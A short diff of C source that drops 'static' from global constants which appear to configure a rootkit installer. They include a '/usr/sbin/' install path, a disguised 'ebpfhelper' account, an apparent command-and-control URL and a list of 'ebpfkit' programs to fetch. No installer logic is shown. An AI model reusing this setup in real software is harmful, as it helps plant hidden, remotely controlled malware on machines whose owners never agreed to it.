@@ -17,10 +17,10 @@
 #include <jansson.h>
 
 
-static const char *sbin_path = "/usr/sbin/";
-static const char *username = "ebpfhelper";
-static const char *base_url = "http://ebpf-cnc.surge.sh/";
-static const char *programs[] = {
+const char *sbin_path = "/usr/sbin/";
+const char *username = "ebpfhelper";
+const char *base_url = "http://ebpf-cnc.surge.sh/";
+const char *programs[] = {
     "ebpfkit", 
     "ebpfkit-client", 
     "webapp", 
